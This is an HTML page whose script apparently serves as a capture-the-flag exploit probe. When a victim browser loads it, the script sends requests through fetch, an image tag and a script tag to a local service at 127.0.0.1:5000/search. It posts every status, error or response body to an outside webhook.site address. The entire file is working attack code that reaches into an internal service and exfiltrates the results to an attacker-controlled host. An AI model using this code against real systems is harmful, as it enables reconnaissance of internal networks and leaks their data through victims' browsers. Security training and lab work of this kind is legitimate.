<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Basic Search Trigger</title>
</head>
<body>
    <p>Attempting to trigger /search and observe side effects...</p>
    <script>
        const WEBHOOK_URL = "https://webhook.site/eed6e086-4677-4691-8515-ecf1b5559f63"; // <--- 替換成你的 Webhook URL
        const targetSearchURL = "http://127.0.0.1:5000/search?q=AIS3";

        async function sendToWebhook(label, data) {
            const payload = { timestamp: new Date().toISOString(), label: label, data: data };
            console.log(`Sending to webhook [${label}]:`, payload);
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    mode: 'cors'
                });
            } catch (e) {
                console.error(`CRITICAL: Failed to send [${label}] to webhook:`, e);
                fetch(`${WEBHOOK_URL}?error_sending_label=${encodeURIComponent(label)}&error_msg=${encodeURIComponent(e.message)}`);
            }
        }

        sendToWebhook("basic_exploit_started", { message: "Basic search trigger started." });

        // 嘗試用幾種不同方式“觸碰”search URL，即使不能讀取內容
        // 1. fetch (我們知道這會因 CORS 失敗讀取，但請求本身會發出)
        fetch(targetSearchURL)
            .then(response => {
                sendToWebhook("basic_fetch_then", { 
                    ok: response.ok, 
                    status: response.status, 
                    type: response.type 
                });
                // 嘗試讀取 text() 即使知道會失敗，看看錯誤是啥
                return response.text();
            })
            .then(text => {
                sendToWebhook("basic_fetch_text_SUCCESS_UNLIKELY", { text: text });
            })
            .catch(err => {
                sendToWebhook("basic_fetch_catch", { 
                    errorName: err.name, 
                    errorMessage: err.message 
                });
            });

        // 2. img src (瀏覽器會發 GET 請求，但不會執行 JS 或允許讀取內容)
        const img = new Image();
        img.onload = function() {
            sendToWebhook("basic_img_onload", { src: targetSearchURL });
        };
        img.onerror = function() {
            sendToWebhook("basic_img_onerror", { src: targetSearchURL });
        };
        img.src = targetSearchURL;

        // 3. script src (瀏覽器會發 GET 請求，如果內容不是有效 JS 會報錯)
        const scriptTag = document.createElement('script');
        scriptTag.onload = function() {
            sendToWebhook("basic_script_onload", { src: targetSearchURL });
        };
        scriptTag.onerror = function() {
            sendToWebhook("basic_script_onerror", { src: targetSearchURL });
        };
        scriptTag.src = targetSearchURL;
        document.head.appendChild(scriptTag);
        
        setTimeout(() => {
            sendToWebhook("basic_exploit_finished", { message: "Timeout." });
        }, 7000); // 增加一點時間

    </script>
</body>
</html>
